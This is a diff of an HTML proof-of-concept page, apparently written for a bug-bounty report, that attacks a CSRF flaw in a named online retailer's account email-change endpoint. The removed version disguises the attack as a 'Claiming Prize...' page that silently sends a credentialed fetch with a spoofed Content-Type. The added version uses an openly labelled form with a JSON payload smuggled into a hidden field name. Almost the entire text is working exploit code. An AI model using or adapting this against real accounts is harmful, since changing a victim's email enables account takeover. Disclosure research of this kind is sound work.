@@ -1,24 +1,19 @@
 <!DOCTYPE html>
 <html>
 
-<body>
-    <h1>Claiming Prize...</h1>
+<head>
+    <title>Boozt CSRF Content-Type Confusion POC</title>
+</head>
 
-    <script>
-        // We use fetch to spoof the Content-Type
-        fetch("https://www.boozt.com/eu/en/api/customer/profile/email/change", {
-            method: "POST",
-            mode: "no-cors",
-            credentials: "include", // Sends your cookies
-            headers: {
-                // We lie to the server. The browser accepts this header in no-cors mode.
-                "Content-Type": "multipart/form-data"
-            },
-            // We put the JSON here. 
-            // The server sees the header, accepts the request, then sniffs the JSON body.
-            body: '{"email":"absolutexon+spoof@wearehackerone.com"}'
-        });
-    </script>
+<body>
+    <h1>Boozt CSRF Content-Type Confusion POC</h1>
+    <form id="csrf-form" action="https://www.boozt.com/eu/en/api/customer/profile/email/change" method="POST"
+        enctype="application/x-www-form-urlencoded">
+        <input type="hidden" name='{"email":"absolutexon+csrfpoc@wearehackerone.com"}' value=''>
+        <input type="submit" value="Exploit CSRF">
+    </form>
+    <p>Make sure you are logged in to Boozt in another tab, then click the button above. If the email changes, the
+        vulnerability is confirmed.</p>
 </body>
 
 </html>
